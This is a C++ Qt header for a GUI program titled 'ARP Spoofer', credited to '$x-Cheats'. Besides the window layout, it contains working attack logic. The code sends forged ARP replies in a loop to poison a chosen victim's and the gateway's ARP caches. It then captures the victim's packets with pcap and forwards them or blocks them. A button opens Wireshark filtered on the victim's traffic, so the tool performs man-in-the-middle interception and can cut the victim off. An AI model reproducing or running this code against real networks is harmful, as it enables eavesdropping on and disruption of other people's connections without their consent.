/********************************************************************************
** Form generated from reading UI file 'untitledxEGzUJ.ui'
**
** Created by: Qt User Interface Compiler version 6.3.1
**
** WARNING! All changes made in this file will be lost when recompiling UI file!
********************************************************************************/

#ifndef UNTITLEDXEGZUJ_H
#define UNTITLEDXEGZUJ_H

#include <QtCore/QVariant>
#include <QtWidgets/QApplication>
#include <QtWidgets/QFrame>
#include <QtWidgets/QComboBox>
#include <QtWidgets/QCheckBox>
#include <QtWidgets/QHBoxLayout>
#include <QtWidgets/QLabel>
#include <QtWidgets/QLineEdit>
#include <QtWidgets/QMainWindow>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QScrollArea>
#include <QtGui/QPainter>
#include <QtWidgets/QSpacerItem>
#include <QtWidgets/QVBoxLayout>
#include <QtWidgets/QWidget>
#include <QtCore/QRegularExpression>
#include <QtGui/QValidator>
#include <QtCore/qthread.h>
#include <Qt3DInput/qmouseevent.h>
#include <QtConcurrent/QtConcurrent>
#include <QtCore/QProcess>
#include <QtWidgets/QStyle>
#include <QtCore/QObject>
#include "./NetworkApi.h"

#include <stdio.h>
#include <stdlib.h>

#define WIRESHARK_PATH "C:\\Program Files\\Wireshark\\Wireshark.exe"

void CloseApp();
void MinimizeApp();

struct _Spoof_
{
   bool Started,Block,InRequest=false;
   int PingTimeSpoofARP = 500;
   BYTE Mode;
   IPv4 VictimIp;
   MAC  VictimMAc;
  

} Spoof;


struct _rgb_
{
    int r,g,b,a=1;
    _rgb_(int _r=255,int _g=255,int _b=255,int _a=255): r(_r),g(_g),b(_b),a(_a) {};
    std::string tostring()
    {
        return ("rgba("+(std::to_string(r)+","+std::to_string(g)+","+std::to_string(b)+","+std::to_string(a)+")"));
    }
};

void Intercept(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);



class QPaintWidget :public QWidget
{
    Q_OBJECT

    public:
      QPainter painter;
      QPaintWidget(QWidget * parent)  : QWidget(parent),painter(this) {};
  
    
    virtual  void paintEvent(QPaintEvent * pe)
    {

             painter.begin(this);
             painter.restore();
             painter.setPen(QPen(QColor(40, 40, 40),4));
            
  
           
             if(Spoof.Mode ==0)
            {
                painter.drawLine(60,60,15,60);
                painter.drawLine(15,60,15,270);
                painter.drawLine(15,270,295,270);
                painter.drawLine(395,270,580,270);
                painter.drawLine(580,270,580,130);
                painter.drawLine(570,130,570,260);
                painter.drawLine(570,260,395,260);

                painter.drawLine(295,260,215,260);
                painter.drawLine(215,260,215,60);
                painter.drawLine(215,60,180,60);
                if(Spoof.Block)
                   painter.drawLine(420,275,430,255);

            }else if(Spoof.Mode == 1)
            {
                  painter.drawLine(60,60,15,60);
                  painter.drawLine(15,60,15,10);
                  painter.drawLine(15,10,655,10);
                  painter.drawLine(655,10,655,185);
                  painter.drawLine(655,185,600,185);
                  painter.drawLine(600,185,600,140);
                  painter.drawLine(570,130,570,260);
                  painter.drawLine(570,260,395,260);

                  painter.drawLine(295,260,215,260);
                  painter.drawLine(215,260,215,60);
                  painter.drawLine(215,60,180,60);
                  

                  if(Spoof.Block)
                         painter.drawLine(240,265,250,255);
            }

              painter.setPen(QPen(QColor(43, 71, 231),4));
              painter.drawLine(395,250,545,250);
              painter.drawLine(545,250,545,130);
              painter.drawLine(515,105,255,105);
              painter.drawLine(255,105,255,40);
              painter.drawLine(255,40,180,40);
              if(!Spoof.Started)
                     painter.drawLine(525,245,515,255);
            
            painter.end();
    

        }


};

class _ARP_ATTACK_ : public QThread
{
    public:

    void run()
    {
         pcap_loop(NetworkAPI.ph, 0, Intercept, NULL);
    }


} attack;

void ResetGateway()
{
    NetworkAPI.ARPSpoofing.Send(Spoof.VictimIp,Spoof.VictimMAc);
    for(int x=0;x<= FORCE_ACCEPT_REPLY;x++)    
       NetworkAPI.ARPSpoofing.Reset(Spoof.VictimIp,Spoof.VictimMAc);
}

template<typename T>
inline void SetTextAndColor(T t,_rgb_ color,char * text)
{
    QMetaObject::invokeMethod(t,"setText",Qt::QueuedConnection,Q_ARG(QString, (QString("<h4 style=\"color: %1;\">%2</h4>").arg(color.tostring().c_str()).arg(text))));
}

QT_BEGIN_NAMESPACE

class Ui_MainWindow
{
public:
    QWidget *MAIN_BACKGROUND;
    QFrame *frame;
    QLabel *Title;
    QPushButton *BP_CLOSE;
    QPushButton *BP_MINIMIZE;
    QLabel *iptitle;
    QLineEdit *IP_VICTIM;
    QPushButton *BP_SPOOF;
    QLabel *STATUT;
    QComboBox *ARP_SPOOFIND_MODE;
    QLabel *VICTIM_IP_TITLE;
    QLabel *MODE_TITLE;
    QPushButton *BP_VIEW_TRAFFIC;
    QWidget *TRAME;
    QLabel *TRAME_TITLE;
    QPushButton *BP_VTN_RETURN;
    QLabel *VICTIM;
    QLabel *ATTACKER;
    QLabel *ROOTER;
    QLabel *MITM_IP_VICTIM;
    QLabel *MITM_IP_ATTACKER;
    QLabel *MITM_IP_GATEWAY;
    QPaintWidget *Connecter;
    QLabel *TITLE_SEND_ARP;
    QWidget *BACKGROUND;
    QCheckBox *CHECKBOX_BLOCK_PACKET;
    QLabel *AUTHOR;
    QSlider *SLIDER_TIMEPINGARP;
    QLabel *TIMEPINGARP;
    QPushButton *BP_WIRESHARK;

    bool spoofed=false;

    void setupUi(QMainWindow *MainWindow)
    {
        if (MainWindow->objectName().isEmpty())
            MainWindow->setObjectName(QString::fromUtf8("ARP Spoofer"));
        MainWindow->resize(1012, 362);
        MAIN_BACKGROUND = new QWidget(MainWindow);
        MAIN_BACKGROUND->setObjectName(QString::fromUtf8("MAIN_BACKGROUND"));
        MAIN_BACKGROUND->setStyleSheet(QString::fromUtf8("background-color: transparent;\n"
"border-radius:6px"));
        frame = new QFrame(MAIN_BACKGROUND);
        frame->setObjectName(QString::fromUtf8("frame"));
        frame->setGeometry(QRect(0, 0, 333, 30));
        frame->setStyleSheet(QString::fromUtf8("background-color: rgb(215, 215, 215);"));
        frame->setFrameShape(QFrame::StyledPanel);
        frame->setFrameShadow(QFrame::Raised);
        Title = new QLabel(frame);
        Title->setObjectName(QString::fromUtf8("Title"));
        Title->setGeometry(QRect(0, -2, 331, 32));
        QFont font;
        font.setPointSize(14);
        font.setBold(true);
        Title->setFont(font);
        Title->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        Title->setAlignment(Qt::AlignCenter);
        BP_CLOSE = new QPushButton(frame);
        BP_CLOSE->setObjectName(QString::fromUtf8("BP_CLOSE"));
        BP_CLOSE->setGeometry(QRect(308, 7, 15, 15));
        QFont font1;
        font1.setFamilies({QString::fromUtf8("FantasqueSansMono Nerd Font")});
        font1.setPointSize(20);
        font1.setBold(true);
        BP_CLOSE->setFont(font1);
        BP_CLOSE->setCursor(QCursor(Qt::PointingHandCursor));
        BP_CLOSE->setStyleSheet(QString::fromUtf8("background:rgb(255,55,90);\n"
"border-radius:7px;"));
        BP_MINIMIZE = new QPushButton(frame);
        BP_MINIMIZE->setObjectName(QString::fromUtf8("BP_MINIMIZE"));
        BP_MINIMIZE->setGeometry(QRect(285, 7, 15, 15));
        BP_MINIMIZE->setFont(font1);
        BP_MINIMIZE->setCursor(QCursor(Qt::PointingHandCursor));
        BP_MINIMIZE->setStyleSheet(QString::fromUtf8("background:rgb(209, 203, 2);\n"
"border-radius:7px;"));
        iptitle = new QLabel(MAIN_BACKGROUND);
        iptitle->setObjectName(QString::fromUtf8("iptitle"));
        iptitle->setGeometry(QRect(5, 30, 330, 20));
        QFont font2;
        font2.setPointSize(8);
        font2.setBold(true);
        iptitle->setFont(font2);
        iptitle->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        iptitle->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        IP_VICTIM = new QLineEdit(MAIN_BACKGROUND);
        IP_VICTIM->setObjectName(QString::fromUtf8("IP_VICTIM"));
        QValidator *l_valid = new QRegularExpressionValidator(QRegularExpression("^(\\d{0,3}\\x2e){3}\\d{3}"), (QObject*)MAIN_BACKGROUND);
        IP_VICTIM->setValidator(l_valid);
        IP_VICTIM->setGeometry(QRect(75, 100, 180, 38));
        QFont font3;
        font3.setPointSize(15);
        font3.setBold(true);
        IP_VICTIM->setFont(font3);
        IP_VICTIM->setStyleSheet(QString::fromUtf8("background-color: rgb(213, 213, 213);\n"
"color:rgb(45,45,45);\n"
"border-radius:0px;\n"
"border-top-left-radius:4px;\n"
"border-top-right-radius:4px;\n"
"border-bottom:   2px solid rgb(30,30,30)\n"
""));
        IP_VICTIM->setMaxLength(15);
        IP_VICTIM->setAlignment(Qt::AlignCenter);
        BP_SPOOF = new QPushButton(MAIN_BACKGROUND);
        BP_SPOOF->setObjectName(QString::fromUtf8("BP_SPOOF"));
        BP_SPOOF->setGeometry(QRect(112, 265, 105, 32));
        BP_SPOOF->setFont(font);
        BP_SPOOF->setCursor(QCursor(Qt::PointingHandCursor));
        BP_SPOOF->setStyleSheet(QString::fromUtf8("background-color: rgb(213, 213, 213);\n"
"color:rgb(40,40,40);\n"
"border-radius:4px;"));
        STATUT = new QLabel(MAIN_BACKGROUND);
        STATUT->setObjectName(QString::fromUtf8("STATUT"));
        STATUT->setGeometry(QRect(0, 310, 330, 20));
        QFont font4;
        font4.setPointSize(8);
        font4.setBold(false);
        STATUT->setFont(font4);
        STATUT->setCursor(QCursor(Qt::PointingHandCursor));
        STATUT->setStyleSheet(QString::fromUtf8("QLabel#STATUT[text=\"Invalid Ip !\"]\n"
"{\n"
"color:rgb(40,255,40);\n"
"}"));
        STATUT->setAlignment(Qt::AlignCenter);
        ARP_SPOOFIND_MODE = new QComboBox(MAIN_BACKGROUND);
        ARP_SPOOFIND_MODE->addItem(QString());
        ARP_SPOOFIND_MODE->addItem(QString());
        ARP_SPOOFIND_MODE->setObjectName(QString::fromUtf8("ARP_SPOOFIND_MODE"));
        ARP_SPOOFIND_MODE->setGeometry(QRect(75, 180, 180, 30));
        QFont font5;
        font5.setPointSize(12);
        font5.setBold(true);
        ARP_SPOOFIND_MODE->setFont(font5);
        ARP_SPOOFIND_MODE->setCursor(QCursor(Qt::PointingHandCursor));
        ARP_SPOOFIND_MODE->setStyleSheet(QString::fromUtf8("\n"
"QComboBox\n"
"{\n"
"background-color: rgb(213, 213, 213);\n"
"color:rgb(45,45,45);\n"
"border-radius:0px;\n"
"border-top-left-radius:4px;\n"
"border-top-right-radius:4px;\n"
"\n"
"border-bottom:   2px solid rgb(30,30,30)\n"
"\n"
"}\n"
"\n"
"\n"
"QComboBox::drop-down {\n"
"\n"
"    width: 20px;\n"
"    border-left: 2px solid darkgray;\n"
"    border-top-right-radius: 3px; /* same radius as the QComboBox */\n"
"\n"
"}\n"
"\n"
"QComboBox::down-arrow {\n"
"   width:15px;\n"
"	image: url(./da.png);\n"
"\n"
"}\n"
"\n"
"QComboBox QAbstractItemView {\n"
"    color:rgb(45,45,45);\n"
"	background-color: rgb(213, 213, 213);\n"
"    border:none;\n"
"   \n"
"}"));
        ARP_SPOOFIND_MODE->setInsertPolicy(QComboBox::InsertAlphabetically);
        ARP_SPOOFIND_MODE->setSizeAdjustPolicy(QComboBox::AdjustToContentsOnFirstShow);
        ARP_SPOOFIND_MODE->setMinimumContentsLength(0);
        ARP_SPOOFIND_MODE->setPlaceholderText(QString::fromUtf8(""));
        VICTIM_IP_TITLE = new QLabel(MAIN_BACKGROUND);
        VICTIM_IP_TITLE->setObjectName(QString::fromUtf8("VICTIM_IP_TITLE"));
        VICTIM_IP_TITLE->setGeometry(QRect(78, 84, 151, 15));
        QFont font6;
        font6.setPointSize(9);
        font6.setBold(true);
        VICTIM_IP_TITLE->setFont(font6);
        VICTIM_IP_TITLE->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        VICTIM_IP_TITLE->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        MODE_TITLE = new QLabel(MAIN_BACKGROUND);
        MODE_TITLE->setObjectName(QString::fromUtf8("MODE_TITLE"));
        MODE_TITLE->setGeometry(QRect(78, 160, 151, 15));
        MODE_TITLE->setFont(font6);
        MODE_TITLE->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        MODE_TITLE->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        BP_VIEW_TRAFFIC = new QPushButton(MAIN_BACKGROUND);
        BP_VIEW_TRAFFIC->setObjectName(QString::fromUtf8("BP_VIEW_TRAFFIC"));
        BP_VIEW_TRAFFIC->setGeometry(QRect(310, 325, 20, 20));
        BP_VIEW_TRAFFIC->setFont(font);
        BP_VIEW_TRAFFIC->setCursor(QCursor(Qt::PointingHandCursor));
        BP_VIEW_TRAFFIC->setStyleSheet(QString::fromUtf8("\n"
"color:rgb(40,40,40);\n"
"border-radius:4px;"));
        TRAME = new QWidget(MAIN_BACKGROUND);
        TRAME->setObjectName(QString::fromUtf8("TRAME"));
        TRAME->hide();
        TRAME->setEnabled(true);
        TRAME->setGeometry(QRect(340, 0, 668, 350));
        TRAME->setStyleSheet(QString::fromUtf8("background-color: rgb(230, 230, 230);"));
        TRAME_TITLE = new QLabel(TRAME);
        TRAME_TITLE->setObjectName(QString::fromUtf8("TRAME_TITLE"));
        TRAME_TITLE->setGeometry(QRect(0, 0, 668, 32));
        TRAME_TITLE->setFont(font);
        TRAME_TITLE->setStyleSheet(QString::fromUtf8(""));
        TRAME_TITLE->setAlignment(Qt::AlignCenter);
        BP_VTN_RETURN = new QPushButton(TRAME);
        BP_VTN_RETURN->setObjectName(QString::fromUtf8("BP_VTN_RETURN"));
        BP_VTN_RETURN->setGeometry(QRect(5, 5, 20, 20));
        BP_VTN_RETURN->setFont(font);
        BP_VTN_RETURN->setCursor(QCursor(Qt::PointingHandCursor));
        BP_VTN_RETURN->setStyleSheet(QString::fromUtf8("\n"
"color:rgb(40,40,40);\n"
"border-radius:4px;"));
        VICTIM = new QLabel(TRAME);
        VICTIM->setObjectName(QString::fromUtf8("VICTIM"));
        VICTIM->setGeometry(QRect(30, 45, 180, 180));
        VICTIM->setPixmap(QPixmap(QString::fromUtf8("./Victim.png")));
        VICTIM->setScaledContents(true);
        
        ATTACKER = new QLabel(TRAME);
        ATTACKER->setObjectName(QString::fromUtf8("ATTACKER"));
        ATTACKER->setGeometry(QRect(265, 215, 160, 160));
        ATTACKER->setPixmap(QPixmap(QString::fromUtf8("./Attacker.png")));
        ATTACKER->setScaledContents(true);
        ROOTER = new QLabel(TRAME);
        ROOTER->setObjectName(QString::fromUtf8("ROOTER"));
        ROOTER->setGeometry(QRect(510, 70, 135, 135));
        ROOTER->setPixmap(QPixmap(QString::fromUtf8("./box.png")));
        ROOTER->setScaledContents(true);
        MITM_IP_VICTIM = new QLabel(TRAME);
        MITM_IP_VICTIM->setObjectName(QString::fromUtf8("IP_VICTIM_2"));
        MITM_IP_VICTIM->setGeometry(QRect(85, 180, 91, 20));
        MITM_IP_VICTIM->setFont(font2);
        MITM_IP_VICTIM->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        MITM_IP_ATTACKER = new QLabel(TRAME);
        MITM_IP_ATTACKER->setGeometry(QRect(315, 220, 91, 20));
        MITM_IP_ATTACKER->setFont(font2);
        MITM_IP_ATTACKER->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        MITM_IP_GATEWAY = new QLabel(TRAME);
        MITM_IP_GATEWAY->setGeometry(QRect(550, 187, 91, 20));
        MITM_IP_GATEWAY->setFont(font2);
        MITM_IP_GATEWAY->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        Connecter = new QPaintWidget(TRAME);
        Connecter->setObjectName(QString::fromUtf8("Connecter"));
        Connecter->setEnabled(false);
        Connecter->setGeometry(QRect(0, 60, 668, 300));
        Connecter->setStyleSheet(QString::fromUtf8("background-color: transparent"));
        TITLE_SEND_ARP = new QLabel(Connecter);
        TITLE_SEND_ARP->setObjectName(QString::fromUtf8("TITLE_SEND_ARP"));
        TITLE_SEND_ARP->setGeometry(QRect(395, 225, 110, 20));
        TITLE_SEND_ARP->setFont(font2);
        TITLE_SEND_ARP->setStyleSheet(QString::fromUtf8("color:rgb(43, 71, 231)"));
        TITLE_SEND_ARP->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
       
        VICTIM->raise();
        TRAME_TITLE->raise();
        BP_VTN_RETURN->raise();
        ATTACKER->raise();
        ROOTER->raise();
        Connecter->raise();
        MITM_IP_VICTIM->raise();
        MITM_IP_ATTACKER->raise();
        MITM_IP_GATEWAY->raise();
      
        BACKGROUND = new QWidget(MAIN_BACKGROUND);
        BACKGROUND->setObjectName(QString::fromUtf8("BACKGROUND"));
        BACKGROUND->setGeometry(QRect(0, 0, 333, 351));
        BACKGROUND->setStyleSheet(QString::fromUtf8("background-color: rgb(255, 255, 255);"));
        CHECKBOX_BLOCK_PACKET = new QCheckBox(BACKGROUND);
        CHECKBOX_BLOCK_PACKET->setObjectName(QString::fromUtf8("CHECKBOX_BLOCK_PACKET"));
        CHECKBOX_BLOCK_PACKET->setGeometry(QRect(85, 224, 171, 25));
        QFont font7;
        font7.setPointSize(10);
        font7.setBold(true);
        CHECKBOX_BLOCK_PACKET->setFont(font7);
        CHECKBOX_BLOCK_PACKET->setCursor(QCursor(Qt::PointingHandCursor));
        CHECKBOX_BLOCK_PACKET->setStyleSheet(QString::fromUtf8("QCheckBox {\n"
"    spacing: 5px;\n"
"\n"
"padding:5px;\n"
"}\n"
"\n"
"QCheckBox::indicator {\n"
"    width: 12px;\n"
"    height: 12px;\n"
"   border-radius:1px;\n"
"	border: 2px solid rgb(100,100,100);\n"
"}\n"
"\n"
"QCheckBox::indicator:unchecked {\n"
"   background:rgb(150,150,150)\n"
"}\n"
"\n"
"\n"
"QCheckBox::indicator:checked {\n"
"    background:rgb(100,100,100)\n"
"}\n"
"\n"
""));
 SLIDER_TIMEPINGARP = new QSlider(BACKGROUND);
        SLIDER_TIMEPINGARP->setObjectName(QString::fromUtf8("SLIDER_TIMEPINGARP"));
        SLIDER_TIMEPINGARP->setGeometry(QRect(295, 97, 20, 200));
        SLIDER_TIMEPINGARP->setStyleSheet(QString::fromUtf8("QSlider::groove:vertical {\n"
"    background: rgb(215,215,215);\n"
"border-radius:4px;\n"
"    position: absolute; /* absolutely position 4px from the left and right of the widget. setting margins on the widget should work too... */\n"
"\n"
"}\n"
"\n"
"QSlider::handle:vertical {\n"
"    height: 8px;\n"
" border-radius:4px;\n"
"    background: rgb(130,130,130);\n"
"\n"
"}\n"
"\n"
"QSlider::add-page:vertical {\n"
"    border-radius:4px;\n"
"    background: rgb(60,60,60);\n"
"}\n"
"QSlider::sub-page:vertical {\n"
"     border-radius:4px;\n"
"}\n"
""));
        SLIDER_TIMEPINGARP->setMinimum(50);
        SLIDER_TIMEPINGARP->setMaximum(3000);
        SLIDER_TIMEPINGARP->setPageStep(0);
        SLIDER_TIMEPINGARP->setValue(500);
        SLIDER_TIMEPINGARP->setSliderPosition(500);
        SLIDER_TIMEPINGARP->setOrientation(Qt::Vertical);
        SLIDER_TIMEPINGARP->setInvertedAppearance(false);
        SLIDER_TIMEPINGARP->setInvertedControls(false);
        SLIDER_TIMEPINGARP->setTickPosition(QSlider::NoTicks);
        SLIDER_TIMEPINGARP->setTickInterval(0);
        TIMEPINGARP = new QLabel(BACKGROUND);
        TIMEPINGARP->setObjectName(QString::fromUtf8("TIMEPINGARP"));
        TIMEPINGARP->setGeometry(QRect(285, 300, 51, 20));
        TIMEPINGARP->setFont(font2);
        TIMEPINGARP->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        TIMEPINGARP->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        SLIDER_TIMEPINGARP->raise();
        CHECKBOX_BLOCK_PACKET->setChecked(false);
        CHECKBOX_BLOCK_PACKET->setTristate(false);
        AUTHOR = new QLabel(BACKGROUND);
        AUTHOR->setObjectName(QString::fromUtf8("AUTHOR"));
        AUTHOR->setGeometry(QRect(5, 50, 330, 20));
        AUTHOR->setFont(font2);
        AUTHOR->setStyleSheet(QString::fromUtf8("color:rgb(40,40,40);"));
        AUTHOR->setAlignment(Qt::AlignLeading|Qt::AlignLeft|Qt::AlignVCenter);
        BP_WIRESHARK = new QPushButton(MAIN_BACKGROUND);
        BP_WIRESHARK->setObjectName(QString::fromUtf8("BP_WIRESHARK"));
        BP_WIRESHARK->setGeometry(QRect(220, 40, 105, 32));
        QFont font8;
        font8.setPointSize(13);
        font8.setBold(true);
        BP_WIRESHARK->setFont(font8);
        BP_WIRESHARK->setCursor(QCursor(Qt::PointingHandCursor));
        BP_WIRESHARK->setStyleSheet(QString::fromUtf8("background-color: rgb(213, 213, 213);\n"
"color:rgb(40,40,40);\n"
"border-radius:4px;"));
        MainWindow->setCentralWidget(MAIN_BACKGROUND);
        BACKGROUND->raise();
        MODE_TITLE->raise();
        frame->raise();
        iptitle->raise();
        IP_VICTIM->raise();
        BP_SPOOF->raise();
        STATUT->raise();
        ARP_SPOOFIND_MODE->raise();
        VICTIM_IP_TITLE->raise();
        BP_VIEW_TRAFFIC->raise();
        TRAME->raise();
        BP_WIRESHARK->raise();
         
        QObject::connect(BP_MINIMIZE,QAbstractButton::clicked,[this]{  
             MinimizeApp();
        });

        QObject::connect(BP_CLOSE,QAbstractButton::clicked,[this]{  
            CloseApp();
        });

        QObject::connect(ARP_SPOOFIND_MODE,QComboBox::currentIndexChanged,[this](int idx){  
            if(idx==1)
                 ResetGateway();

            Spoof.Mode = idx;
            Connecter->update();
        });

        QObject::connect(CHECKBOX_BLOCK_PACKET,QCheckBox::stateChanged,[this](int stateChanged){
             
             if(!(bool)stateChanged && Spoof.Started)
                          ResetGateway();

            Spoof.Block =  (bool)stateChanged;
            Connecter->update();

        });
         QObject::connect(BP_SPOOF,QPushButton::clicked,[this]{
            
            if(Spoof.Started)
            {
                Spoof.Started=false;
                Connecter->update();
                MITM_IP_VICTIM->setText("");
                ResetGateway();
                BP_SPOOF->setText("SPOOF");
                return;
            }
            if(spoofed)
                return;
            
             
                
            spoofed = true;
            
               
           
            STATUT->setText("Search ...");
            
            QtConcurrent::run([this]
        {

            const char * VictimIp = IP_VICTIM->text().toStdString().c_str();
            MAC vm = NetworkAPI.GetMACByIp({VictimIp});
           if(!vm.IsValid()||(!strcmp(VictimIp,NetworkAPI.DefaultInterface.Ip.tostring().c_str()) || !strcmp(VictimIp,"255.255.255.255"))) 
                SetTextAndColor(STATUT,{255, 55, 90},"Ip not found !");
           else
           {
                Spoof.Started=true;
                Connecter->update();
                Spoof.VictimIp = {VictimIp};
                Spoof.VictimMAc = vm;
                
                MITM_IP_VICTIM->setText(VictimIp);
                BP_SPOOF->setText("STOP");
            
                SetTextAndColor(STATUT,{55, 255, 90},"Ip found !");  
                attack.start();
                NetworkAPI.ARPSpoofing.Send(Spoof.VictimIp,Spoof.VictimMAc);
                while(Spoof.Started)
                {
 
                    if(!Spoof.InRequest)
                    {
                        if (Spoof.Mode==0)
                             NetworkAPI.ARPSpoofing.Reply(Spoof.VictimIp,Spoof.VictimMAc,NetworkAPI.DefaultInterface.Gateway);
                         
                        NetworkAPI.ARPSpoofing.Reply(NetworkAPI.DefaultInterface.Ip,NetworkAPI.GatewayMAC,Spoof.VictimIp);   
                    }
                    _sleep(Spoof.PingTimeSpoofARP);
                    
                }
                
            
           }
            QThread::sleep(1.75);   
            STATUT->setText("");
            spoofed=false;
            
        });     
    });
    QObject::connect(BP_VIEW_TRAFFIC,QAbstractButton::clicked,[this]{  
            BP_VIEW_TRAFFIC->hide();
            TRAME->show();
           
    });
    QObject::connect(BP_VTN_RETURN,QAbstractButton::clicked,[this]{ 
            BP_VIEW_TRAFFIC->show(); 
            TRAME->hide();   
    });
     QObject::connect(BP_WIRESHARK,QPushButton::clicked,[this](){
        
        if(Spoof.Started)
        {
            QStringList arguments;
            arguments << "-k" << "-i" << std::to_string((NetworkAPI.DefaultInterface.Index/4)).c_str() << "-f" << ("ip src "+ Spoof.VictimIp.tostring() + " || ip dst " + Spoof.VictimIp.tostring()+" || arp dst "+Spoof.VictimIp.tostring()).c_str();
        
            QObject * p;
            QProcess *myProcess = new QProcess(p);
            myProcess->start(WIRESHARK_PATH, arguments);
        }

        });
         QObject::connect(SLIDER_TIMEPINGARP,QSlider::valueChanged,[this](int v){
            Spoof.PingTimeSpoofARP = v;
            TIMEPINGARP->setText((std::to_string(Spoof.PingTimeSpoofARP)+"ms").c_str());
            TITLE_SEND_ARP->setText("ARP delay ("+TIMEPINGARP->text()+")");
         });
        


        retranslateUi(MainWindow);

        QMetaObject::connectSlotsByName(MainWindow);
    } // setupUi

    void retranslateUi(QMainWindow *MainWindow)
    {
        MainWindow->setWindowTitle(QCoreApplication::translate("MainWindow", "MainWindow", nullptr));
        Title->setText(QCoreApplication::translate("MainWindow", "ARP Spoofer", nullptr));
        BP_CLOSE->setText(QString());
        BP_MINIMIZE->setText(QString());
        iptitle->setText(QCoreApplication::translate("MainWindow", ("Your ip :"+NetworkAPI.DefaultInterface.Ip.tostring()).c_str(), nullptr));
        IP_VICTIM->setText(QCoreApplication::translate("MainWindow", "255.255.255.255", nullptr));
        BP_SPOOF->setText(QCoreApplication::translate("MainWindow", "SPOOF", nullptr));
        STATUT->setText(QString());
        ARP_SPOOFIND_MODE->setItemText(0, QCoreApplication::translate("MainWindow", "       Bidirectional", nullptr));
        ARP_SPOOFIND_MODE->setItemText(1, QCoreApplication::translate("MainWindow", "       Unidirectional", nullptr));

        ARP_SPOOFIND_MODE->setCurrentText(QCoreApplication::translate("MainWindow", "       Bidirectional", nullptr));
        VICTIM_IP_TITLE->setText(QCoreApplication::translate("MainWindow", "Victim ip", nullptr));
        MODE_TITLE->setText(QCoreApplication::translate("MainWindow", "Mode", nullptr));
#if QT_CONFIG(tooltip)
        BP_VIEW_TRAFFIC->setToolTip(QCoreApplication::translate("MainWindow", "Traffic Network", nullptr));
#endif
        BP_VIEW_TRAFFIC->setText(QCoreApplication::translate("MainWindow", "\357\201\224", nullptr));
        TRAME_TITLE->setText(QCoreApplication::translate("MainWindow", "MITM", nullptr));
        BP_VTN_RETURN->setText(QCoreApplication::translate("MainWindow", "\357\201\223", nullptr));
        VICTIM->setText(QString());
        ATTACKER->setText(QString());
        ROOTER->setText(QString());
        MITM_IP_VICTIM->setText(QString());
        MITM_IP_ATTACKER->setText(NetworkAPI.DefaultInterface.Ip.tostring().c_str());
        MITM_IP_GATEWAY->setText(NetworkAPI.DefaultInterface.Gateway.tostring().c_str());
        CHECKBOX_BLOCK_PACKET->setText(QCoreApplication::translate("MainWindow", "Block packets", nullptr));
        AUTHOR->setText(QCoreApplication::translate("MainWindow", "Author : $x-Cheats", nullptr));
        TIMEPINGARP->setText(QCoreApplication::translate("MainWindow", "1000ms", nullptr));
        BP_WIRESHARK->setText(QCoreApplication::translate("MainWindow", "Wireshark", nullptr));
        TITLE_SEND_ARP->setText(QCoreApplication::translate("MainWindow", "ARP delay (1000ms)", nullptr));
    } 

};

namespace Ui {
    class MainWindow: public Ui_MainWindow {};
} 

QT_END_NAMESPACE


class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    Ui::MainWindow *ui;
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

private:

    QPoint Base=this->pos();
    void mousePressEvent (QMouseEvent * event)
    {
        if(event->buttons() == Qt::MouseButton::LeftButton)
                 Base=event->globalPos();
        
    } 
    void mouseMoveEvent (QMouseEvent * event)
    {
        if(event->buttons() == Qt::MouseButton::LeftButton)
        { 
            this->move((this->pos()+event->globalPos())-Base);    
            Base=event->globalPos();

        }
    } 
};

QApplication  * a;
MainWindow    * w;

void Intercept(u_char *param, const struct pcap_pkthdr * header, const u_char * pkt_data)
{
    if(!Spoof.Started)
         return;
 
        EthernetHeader * eh = (EthernetHeader*)pkt_data;
      
        if(eh->type == htons(0x0800) &&  !Spoof.Block)
             {
                
                if(Spoof.Mode ==0 && !memcmp(eh->src,Spoof.VictimMAc.toarray(),6) && !memcmp(eh->dest,NetworkAPI.DefaultInterface.Mac.toarray(),6))
                {
                        Spoof.InRequest=true; 
                        static uint8_t packet[65536];
                        memcpy(packet, pkt_data, header->len);
                        EthernetHeader * new_eh = (EthernetHeader*)packet;
                       
                        memcpy(new_eh->dest,NetworkAPI.GatewayMAC.toarray(),6);
                        memcpy(new_eh->src,NetworkAPI.DefaultInterface.Mac.toarray(),6);

                        pcap_sendpacket(NetworkAPI.ph, (const BYTE*)&packet, header->len);
                
         
        }else if(!memcmp(eh->dest,NetworkAPI.DefaultInterface.Mac.toarray(),6))
        {       
            Spoof.InRequest=true; 
            IPv4Header * ipv4 = (IPv4Header*)(pkt_data+sizeof(EthernetHeader));
            if(!memcmp(ipv4->Dst,Spoof.VictimIp.toarray(),4))
            {
                static uint8_t packet[65536];
                memcpy(packet, pkt_data, header->len);
                EthernetHeader * new_eh = (EthernetHeader*)packet;
                memcpy(new_eh->dest,Spoof.VictimMAc.toarray(),6);
                memcpy(new_eh->src,NetworkAPI.DefaultInterface.Mac.toarray(),6);
                pcap_sendpacket(NetworkAPI.ph, (const BYTE*)&packet, header->len);

            }

                
        }
        Spoof.InRequest=false;
        }

       
    
}


#endif // MAINWINDOW_H
